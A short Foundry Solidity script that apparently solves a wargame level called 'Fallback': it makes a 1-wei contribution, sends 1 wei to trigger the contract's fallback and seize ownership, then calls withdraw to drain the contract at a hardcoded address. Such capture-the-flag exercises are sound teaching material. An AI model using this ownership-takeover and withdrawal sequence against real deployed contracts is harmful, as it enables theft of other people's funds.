// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback public _fallback;

    function setUp() public {
    }

    function run() public {
        _fallback = Fallback(payable(0x1cc88aF90fE22eAd810e74C5d55859bF11012886));

        vm.startBroadcast();

        _fallback.contribute{value: 1 wei}();
        (bool success, ) = address(_fallback).call{value: 1 wei}("");
        require(success, "failed to trigger fallback function");

        _fallback.withdraw();

        console.log("Attack Balance:", _fallback.owner());

        vm.stopBroadcast();
    }
}
